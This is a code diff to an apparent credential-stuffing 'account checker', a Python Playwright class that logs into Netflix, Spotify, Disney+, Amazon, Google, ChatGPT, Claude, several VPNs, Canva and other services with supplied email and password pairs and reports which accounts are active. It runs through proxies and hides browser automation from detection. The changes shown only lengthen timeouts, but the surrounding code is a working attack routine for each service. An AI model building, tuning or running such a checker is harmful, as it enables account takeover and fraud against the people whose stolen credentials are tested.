@@ -19,6 +19,7 @@ class BrowserChecker:
         browser = await playwright.chromium.launch(
             headless=self.headless,
             proxy={"server": self.proxy} if self.proxy else None,
+            timeout=120000,
             args=[
                 '--disable-blink-features=AutomationControlled',
                 '--no-sandbox',
@@ -37,12 +38,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://accounts.spotify.com/en/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input#login-username', email)
             await page.fill('input#login-password', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(15000)
 
             if "browse" in page.url or "home" in page.url:
                 await page.goto("https://www.spotify.com/account/overview/")
@@ -63,12 +64,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.netflix.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="userLoginId"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "browse" in page.url:
                 return True, "Netflix account active"
@@ -84,15 +85,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.disneyplus.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "Disney+ account active"
@@ -108,15 +109,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.max.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[type="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "browse" in page.url or "home" in page.url:
                 return True, "HBO Max account active"
@@ -132,15 +133,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.amazon.com/ap/signin", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('#ap_email', email)
             await page.click('#continue')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('#ap_password', password)
             await page.click('#signInSubmit')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "primevideo" in page.url or "prime" in page.url.lower():
                 return True, "Prime Video account active"
@@ -161,7 +162,7 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(12000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url or "profile" in page.url:
                 return True, "Crunchyroll account active"
@@ -177,12 +178,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.hulu.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "Hulu account active"
@@ -198,15 +199,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.paramountplus.com/login/", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url:
                 return True, "Paramount+ account active"
@@ -222,15 +223,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.peacocktv.com/signin", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "browse" in page.url:
                 return True, "Peacock account active"
@@ -246,15 +247,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://app.plex.tv/auth/#!", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.click('button:has-text("Sign In")')
-            await page.wait_for_timeout(1000)
+            await page.wait_for_timeout(2000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "dashboard" in page.url:
                 return True, "Plex account active"
@@ -270,12 +271,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.starz.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url:
                 return True, "Starz account active"
@@ -291,12 +292,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.mgmplus.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "MGM+ account active"
@@ -312,15 +313,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.discoveryplus.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url:
                 return True, "Discovery+ account active"
@@ -336,12 +337,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.espn.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "espn.com" in page.url and "login" not in page.url:
                 return True, "ESPN+ account active"
@@ -357,12 +358,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://tubitv.com/signin", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url:
                 return True, "Tubi account active"
@@ -378,12 +379,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://pluto.tv/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "home" in page.url or "pluto.tv" in page.url:
                 return True, "Pluto TV account active"
@@ -399,15 +400,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://accounts.google.com/signin", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[type="email"]', email)
             await page.click('#identifierNext')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[type="password"]', password)
             await page.click('#passwordNext')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "myaccount" in page.url or "google" in page.url:
                 return True, "YouTube Music account active"
@@ -423,15 +424,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.amazon.com/music/player", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('#ap_email', email)
             await page.click('#continue')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('#ap_password', password)
             await page.click('#signInSubmit')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "music" in page.url:
                 return True, "Amazon Music account active"
@@ -447,18 +448,18 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://chat.openai.com/auth/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.click('button[data-testid="login-with-email"]')
-            await page.wait_for_timeout(1000)
+            await page.wait_for_timeout(2000)
 
             await page.fill('input[name="username"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "chat" in page.url:
                 return True, "ChatGPT account active"
@@ -474,15 +475,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://claude.ai/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[type="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "claude.ai" in page.url and "login" not in page.url:
                 return True, "Claude AI account active"
@@ -498,15 +499,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.perplexity.ai/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[type="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "perplexity.ai" in page.url and "login" not in page.url:
                 return True, "Perplexity AI account active"
@@ -522,12 +523,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://cursor.sh/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[type="email"]', email)
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "dashboard" in page.url or "cursor.sh" in page.url:
                 return True, "Cursor account active"
@@ -543,12 +544,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://account.surfshark.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "dashboard" in page.url:
                 return True, "Surfshark account active"
@@ -564,15 +565,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://my.nordaccount.com/login/", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "dashboard" in page.url:
                 return True, "NordVPN account active"
@@ -588,12 +589,12 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.expressvpn.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "account" in page.url:
                 return True, "ExpressVPN account active"
@@ -609,15 +610,15 @@ class BrowserChecker:
         playwright, browser, page = await self._init_browser()
         try:
             await page.goto("https://www.canva.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
 
             await page.fill('input[name="email"]', email)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(3000)
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(10000)
+            await page.wait_for_timeout(15000)
 
             if "canva.com" in page.url and "login" not in page.url:
                 return True, "Canva account active"
